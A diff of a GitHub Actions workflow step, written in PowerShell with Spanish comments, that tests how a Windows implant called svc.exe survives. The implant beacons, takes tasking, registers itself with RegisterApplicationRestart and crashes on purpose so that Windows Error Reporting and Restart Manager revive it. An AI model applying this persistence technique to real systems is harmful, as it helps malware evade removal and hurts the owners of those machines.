@@ -152,20 +152,28 @@ jobs:
             Remove-Item $zip -Force
             $svc = Get-ChildItem $dir -Filter 'svc.exe' | Select-Object -First 1
             if (-not $svc) { Write-Host "NO PACK PARTS"; exit 1 }
-            # E8-P5: el implante corre, beacon, consume tasking (op=pfrst registra el
-            # proceso para reinicio con flags 0xC + mascara derivada; op=pfrun sondea
-            # la lectura inversa del OS). 260 s = 1 epoca de poll + margen; vida >> 60 s
-            # (regla de RegisterApplicationRestart: solo revive procesos con >= 60 s).
+            # E8-P5 v3: el implante corre y consume tasking por fases del driver:
+            # pfrst (registra flags 0xC + mascara, poll ~+300 s de vida > regla 60 s),
+            # pfrun (sonda pre-kill), pfrash (CRASH autoguardado: solo si registrado
+            # -> WER -> RM revive; el revivido responde reg=0 y vive).
             $p = Start-Process -FilePath $svc.FullName -PassThru -WindowStyle Hidden
             Write-Host ("P5 OLDPID=" + $p.Id + " START=" + $p.StartTime.ToString("HH:mm:ss"))
             Start-Sleep -Seconds 400
             $alive = Get-Process -Id $p.Id -ErrorAction SilentlyContinue
             if ($alive) { Write-Host ("P5 pre-kill alive, cpu=" + $alive.CPU) } else { Write-Host "P5 pre-kill: svc ended early" }
-            # MUERTE REAL: Stop-Process -Force = TerminateProcess. WER/RestartManager
-            # ve el registro 0xC y re-lanza el mismo exe con la mascara como cmdline.
-            Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue
+            # v3 CAUSA 22: el revival del contrato es TRAS CRASH (WER), no tras kill
+            # externo (v1/v2: NO-REVIVAL + WER none con TerminateProcess). El agente
+            # muere SOLO via op pfrash del tasking (write-volatile a NULL = AV no
+            # manejada -> WER Event 1000 -> el RM relanza con la mascara). Espera
+            # pasiva de la muerte propia: hasta 600 s.
+            $died = $false
+            for ($i = 0; $i -lt 120; $i++) {
+              Start-Sleep -Seconds 5
+              if (-not (Get-Process -Id $p.Id -ErrorAction SilentlyContinue)) { $died = $true; break }
+            }
             $killedAt = Get-Date
-            Write-Host ("P5 KILLED=" + $p.Id + " AT=" + $killedAt.ToString("HH:mm:ss"))
+            if ($died) { Write-Host ("P5 CRASHED=" + $p.Id + " AT=" + $killedAt.ToString("HH:mm:ss")) }
+            else { Write-Host "P5 CRASH-TIMEOUT: proceso vivo tras 600 s de espera" }
             # ventana de revival: muestreo cada 5 s hasta 200 s. pid nuevo del mismo
             # exe + CommandLine = la mascara hex de 48 chars (evidencia de proceso).
             $new = $null
